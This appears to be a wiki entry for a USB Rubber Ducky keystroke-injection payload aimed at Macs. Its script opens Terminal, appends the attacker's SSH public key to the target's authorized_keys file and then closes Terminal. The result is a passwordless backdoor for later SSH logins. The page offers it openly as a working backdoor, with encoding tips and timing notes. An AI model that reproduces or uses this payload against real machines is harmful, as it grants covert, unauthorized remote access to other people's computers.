**Author: Jesse Wallace (c0deous)**

This script adds an ssh public key to the authorized_keys file on a target's mac. After running you can connect to the target computer with `ssh targetuser@targetcomputer` and you will be granted access without a password.  This a good alternative to the [OS X User Backdoor payload](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---OSX-User-Backdoor). For more information on generating an id_rsa.pub read [this](https://www.digitalocean.com/community/articles/how-to-set-up-ssh-keys--2) (steps 1 & 2).  Note: I reccomend you use [duckencoder 2.6.3](http://code.google.com/p/ducky-decode/downloads/detail?name=DuckEncoder_2.6.3.zip&can=2&q=) to encode these payloads. 
 
Replace RSA_PUB_ID with your SSH Public Key.

    REM Title: OS X Get SSH access
    REM Author: Jesse Wallace (c0deous)
    REM This script adds a ssh public key to the authorized_keys file on a target's mac.
    
    DELAY 1000
    COMMAND SPACE
    DELAY 500
    STRING Terminal
    DELAY 500
    ENTER
    DELAY 800
    STRING echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys
    ENTER
    DELAY 1000
    STRING killall Terminal
    ENTER

    REM Note: you may shorten the times if you think they are too slow.  I made them to accomodate older macs that can't get around very fast.
